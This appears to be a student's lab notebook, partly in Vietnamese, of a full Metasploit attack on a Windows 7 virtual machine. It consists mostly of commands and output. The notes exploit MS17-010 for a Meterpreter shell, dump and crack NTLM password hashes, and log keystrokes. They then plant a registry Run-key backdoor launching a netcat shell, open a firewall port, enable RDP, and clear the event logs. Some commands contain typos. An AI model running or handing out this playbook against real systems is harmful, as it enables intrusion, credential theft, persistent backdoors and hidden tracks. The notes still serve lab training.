ip a


target: 192.168.49.132
attack: 192.168.49.128



PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
554/tcp   open  rtsp
2869/tcp  open  icslap
5357/tcp  open  wsdapi
10243/tcp open  unknown


CVE-2017-0143
ms17-010

---------------------------------------------------
target exploit:


sudo service postgresql start


sudo service postgresql status

----
sudo msfconsole

search ms17-010

search ms17

use auxiliary/scanner/smb/smb_ms17_010 

options

set rhosts 192.168.49.132

run


===================
[+] 192.168.49.132:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.49.132:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
=====================


clear

back




==================



================
in computer win7
vao  local security policy
trong security:
	vao Network accsess: Named Pipes that can be accessed anonymously nhap:
	netloggon
	Isaas
	
=============




search pipe_auditor

use auxiliary/scanner/smb/pipe_auditor

show options

set rhost 192.168.49.132

run

use scanner/smb/pipe_auditor

run

====
[+] 192.168.49.132:445    - Pipes: \netlogon
[*] 192.168.49.132:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

====

clear

back

--------------------


use auxiliary/admin/smb/ms17_010_command

show options

set rhosts 192.168.49.132

run

clear

back

============


search ms17

use exploit/windows/smb/ms17_010_psexec

show options

info

set rhosts 192.168.49.132

clear


search ms17

use auxiliary/scanner/smb/smb_ms17_010

run

search ms17

use exploit/windows/smb/ms17_010_psexec

exploit



=====> meterpreter 
sysinfo

======
Computer        : WIN-6Q8JME10MGK
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
========


1. tien hanh tren may muc tieu
=================

load powershell

Khi bạn sử dụng "load powershell" trong Meterpreter, bạn có thể sử dụng các lệnh PowerShell để thực hiện các hành động như thu thập thông tin hệ thống, thực hiện các kịch bản tấn công, và thậm chí là thực hiện mã độc PowerShell trên máy mục tiêu.

===========
2. import file Get-PassHashes.ps1:   lenh powershell_import <pathfile>

powershell_import /home/kali/penetrationTesting_metasploit/nishang-master/Gather/Get-PassHashes.ps1

=========
3. thuc thi file Get-PassHashes.ps1: lenh powershell_execute <namefile>

powershell_execute Get-PassHashes

=======
meterpreter > powershell_execute Get-PassHashes
[+] Command execution completed:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BHNam_win7:1000:aad3b435b51404eeaad3b435b51404ee:6049f1b3c3709adb275f2bbc4aa9c212:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:eec6daa32fc260011b8c4a1e7c1f8b46:::

ghi cac ma nay vao 1 file: win7

=======

========
tren kali su dung john tool:
john --format=NT win7 --wordlis=/usr/share/wordlists/rockyou.txt


bo qua
================



====
thuc hien lang nghe key:

ps

------vi du lang nghe chuogn trinh notepad.exe PPID 1060
==Lệnh migrate trong Meterpreter của Metasploit được sử dụng để di chuyển quy trình Meterpreter từ một quy trình vào quy trình khác trên hệ thống mục tiêu.
migrate 1060



keyscan_start
keyscan_dump


================
upload 1 phan mem vao win7 qua lenh upload: phan mem nc.exe

upload /home/kali/penetrationTesting_metasploit/nc.exe C:\\windows\\

reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run

reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\nc.exe -Ldp 6666 -e cmd.exe'

reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc

execute -f cmd -i

netsh firewal add portopening TCP 6666 "Service Firewall" ENABLE ALL

netsh firewall show portopening

exit

============================


run post/windows/manage/enable_rdp

run post/windows/manage/enable_rdp USER=<USERNAME> PASS=<PASSWORD> RHOSTS=<TARGET_IP>


run post/windows/manage/enable_rdp USER=BHNam_win7 PASS=123 RHOSTS=192.158.49.132

===========
in kali:
rdesktop -u BHNam_win7 -p 123 192.168.49.132


=============
xoa log

getprivs

getsystem

clearev


























































